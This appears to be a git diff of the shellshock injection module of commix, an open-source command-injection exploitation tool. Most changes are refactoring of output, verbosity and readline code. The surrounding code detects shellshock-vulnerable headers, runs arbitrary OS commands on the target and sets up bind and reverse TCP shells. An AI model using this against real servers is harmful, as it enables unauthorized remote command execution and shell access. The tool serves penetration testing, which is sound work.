@@ -20,27 +20,6 @@ from src.core.requests import parameters
 from src.core.requests import headers as log_http_headers
 from src.core.injections.controller import checks
 
-readline_error = False
-if settings.IS_WINDOWS:
-  try:
-    import readline
-  except ImportError:
-    try:
-      import pyreadline as readline
-    except ImportError:
-      readline_error = True
-else:
-  try:
-    import readline
-    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
-      import gnureadline as readline
-  except ImportError:
-    try:
-      import gnureadline as readline
-    except ImportError:
-      readline_error = True
-pass
-
 default_user_agent = menu.options.agent
 
 """
@@ -494,7 +473,7 @@ def file_access(url, cve, check_header, filename):
     settings.FILE_ACCESS_DONE = True
 
   if settings.FILE_ACCESS_DONE == True:
-    print("")
+    print(settings.SINGLE_WHITESPACE)
 
 """
 Execute the bind / reverse TCP shell
@@ -502,11 +481,11 @@ Execute the bind / reverse TCP shell
 def execute_shell(url, cmd, cve, check_header, filename, os_shell_option):
 
   shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-  if settings.VERBOSITY_LEVEL >= 1:
-    print("")
+  if settings.VERBOSITY_LEVEL != 0:
+    print(settings.SINGLE_WHITESPACE)
 
   err_msg = "The " + os_shell_option.split("_")[0] + " "
-  err_msg += os_shell_option.split("_")[1].upper() + " connection has failed!"
+  err_msg += os_shell_option.split("_")[1].upper() + " connection has failed."
   print(settings.print_critical_msg(err_msg))
 
 """
@@ -529,7 +508,7 @@ def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http
       result = checks.check_bind_tcp_options(settings.RHOST)
 
     else:  
-      cmd = bind_tcp.bind_tcp_options()
+      cmd = bind_tcp.bind_tcp_options(separator = "")
       result = checks.check_bind_tcp_options(cmd)
     if result != None:
       if result == 0:
@@ -561,7 +540,7 @@ def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, h
     if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
       result = checks.check_reverse_tcp_options(settings.LHOST)
     else:  
-      cmd = reverse_tcp.reverse_tcp_options()
+      cmd = reverse_tcp.reverse_tcp_options(separator = "")
       result = checks.check_reverse_tcp_options(cmd)
     if result != None:
       if result == 0:
@@ -623,7 +602,7 @@ def shellshock_handler(url, http_request_method, filename):
   technique = "shellshock injection technique"
 
   info_msg = "Testing the " + technique + ". "
-  if settings.VERBOSITY_LEVEL > 1:
+  if settings.VERBOSITY_LEVEL >= 2:
     info_msg = info_msg + "\n"
   sys.stdout.write(settings.print_info_msg(info_msg))
   sys.stdout.flush()
@@ -666,7 +645,7 @@ def shellshock_handler(url, http_request_method, filename):
           response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
         percent = ((i*100)/total)
         float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
-        
+
         if str(float_percent) == "100.0":
           if no_result == True:
             percent = settings.FAIL_STATUS
@@ -675,10 +654,6 @@ def shellshock_handler(url, http_request_method, filename):
             no_result = False
 
         elif len(response.info()) > 0 and cve in response.info():
-          percent = settings.info_msg
-          no_result = False
-
-        elif len(response.read()) > 0 and cve in response.read():
           percent = settings.info_msg
           no_result = False
 
@@ -705,22 +680,24 @@ def shellshock_handler(url, http_request_method, filename):
           check_header = check_header[1:]
           logs.update_payload(filename, counter, payload) 
 
-          if settings.VERBOSITY_LEVEL >= 1:
+          if settings.VERBOSITY_LEVEL != 0:
+            if settings.VERBOSITY_LEVEL == 1:
+              print(settings.SINGLE_WHITESPACE)
             checks.total_of_requests()
 
           info_msg = "The (" + check_header + ") '"
           info_msg += url + Style.RESET_ALL + Style.BRIGHT 
           info_msg += "' seems vulnerable via " + technique + "."
-          if settings.VERBOSITY_LEVEL <= 1:
-            print("")
+          if settings.VERBOSITY_LEVEL == 0:
+            print(settings.SINGLE_WHITESPACE)
           print(settings.print_bold_info_msg(info_msg))
           sub_content = "\"" + payload + "\""
           print(settings.print_sub_content(sub_content))
 
           # Enumeration options.
           if settings.ENUMERATION_DONE == True :
-            if settings.VERBOSITY_LEVEL >= 1:
-              print("")
+            if settings.VERBOSITY_LEVEL != 0:
+              print(settings.SINGLE_WHITESPACE)
             while True:
               if not menu.options.batch:
                 question_msg = "Do you want to enumerate again? [Y/n] > "
@@ -776,7 +753,7 @@ def shellshock_handler(url, http_request_method, filename):
 
           else:
             # Pseudo-Terminal shell
-            print("")
+            print(settings.SINGLE_WHITESPACE)
             go_back = False
             go_back_again = False
             while True:
@@ -790,22 +767,15 @@ def shellshock_handler(url, http_request_method, filename):
               if len(gotshell) == 0:
                  gotshell= "Y"
               if gotshell in settings.CHOICE_YES:
-                if not menu.options.batch:
-                  print("")
+                # if not menu.options.batch:
+                #   print(settings.SINGLE_WHITESPACE)
                 print("Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
-                if readline_error:
+                if settings.READLINE_ERROR:
                   checks.no_readline_module()
                 while True:
                   try:
-                    if not readline_error:
-                      # Tab compliter
-                      readline.set_completer(menu.tab_completer)
-                      # MacOSX tab compliter
-                      if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
-                        readline.parse_and_bind("bind ^I rl_complete")
-                      # Unix tab compliter
-                      else:
-                        readline.parse_and_bind("tab: complete")
+                    if not settings.READLINE_ERROR:
+                      checks.tab_autocompleter()
                     cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                     cmd = checks.escaped_cmd(cmd)
                     
@@ -827,7 +797,7 @@ def shellshock_handler(url, http_request_method, filename):
                           sys.stdout.write(settings.print_debug_msg(debug_msg))
                           sys.stdout.flush()
                           sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
-                        elif settings.VERBOSITY_LEVEL > 1:
+                        elif settings.VERBOSITY_LEVEL >= 2:
                           sys.stdout.write(settings.print_debug_msg(debug_msg))
                           sys.stdout.flush()
                           sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
@@ -845,12 +815,7 @@ def shellshock_handler(url, http_request_method, filename):
                     print(settings.print_error_msg(err_msg))
                     raise
 
-                  except:
-                    info_msg = "Testing the " + technique + ". "
-                    if settings.VERBOSITY_LEVEL > 1:
-                      info_msg = info_msg + "\n"
-                    sys.stdout.write(settings.print_info_msg(info_msg))
-                    sys.stdout.flush()
+                  except TypeError:
                     break
                     
               elif gotshell in settings.CHOICE_NO:
@@ -873,15 +838,19 @@ def shellshock_handler(url, http_request_method, filename):
         else:
           continue
           
-    if no_result and settings.VERBOSITY_LEVEL < 2:
-      print("")
-
+    if no_result:
+      if settings.VERBOSITY_LEVEL != 2:
+        print(settings.SINGLE_WHITESPACE)
+      err_msg = "All tested HTTP headers appear to be not injectable."
+      print(settings.print_critical_msg(err_msg))
+      raise SystemExit()
+      
   except _urllib.error.HTTPError as err_msg:
-    if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
+    if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
       response = False  
     elif settings.IGNORE_ERR_MSG == False:
       err = str(err_msg) + "."
-      print("\n") + settings.print_critical_msg(err)
+      print("\n" + settings.print_critical_msg(err))
       continue_tests = checks.continue_tests(err_msg)
       if continue_tests == True:
         settings.IGNORE_ERR_MSG = True
@@ -891,8 +860,8 @@ def shellshock_handler(url, http_request_method, filename):
   except _urllib.error.URLError as err_msg:
     err_msg = str(err_msg.reason).split(" ")[2:]
     err_msg = ' '.join(err_msg)+ "."
-    if settings.VERBOSITY_LEVEL >= 1 and settings.LOAD_SESSION == False:
-      print("")
+    if settings.VERBOSITY_LEVEL != 0 and settings.LOAD_SESSION == False:
+      print(settings.SINGLE_WHITESPACE)
     print(settings.print_critical_msg(err_msg))
     raise SystemExit()
 
@@ -915,10 +884,10 @@ def cmd_exec(url, cmd, cve, check_header, filename):
       cmd = "echo " + TAG + "$(" + cmd + ")" + TAG
       payload = shellshock_exploitation(cve, cmd)
       debug_msg = "Executing the '" + cmd + "' command. "
-      if settings.VERBOSITY_LEVEL >= 1:
+      if settings.VERBOSITY_LEVEL != 0:
         sys.stdout.write(settings.print_debug_msg(debug_msg))
       sys.stdout.flush()
-      if settings.VERBOSITY_LEVEL >= 1:
+      if settings.VERBOSITY_LEVEL != 0:
         sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
 
       header = {check_header : payload}
@@ -937,7 +906,7 @@ def cmd_exec(url, cmd, cve, check_header, filename):
         response = tor.use_tor(request)
       else:
         response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
-      shell = response.read().rstrip().replace('\n',' ')
+      shell = checks.page_encoding(response, action="decode").rstrip().replace('\n',' ')
       shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
       shell = ''.join(shell)
       return shell, payload
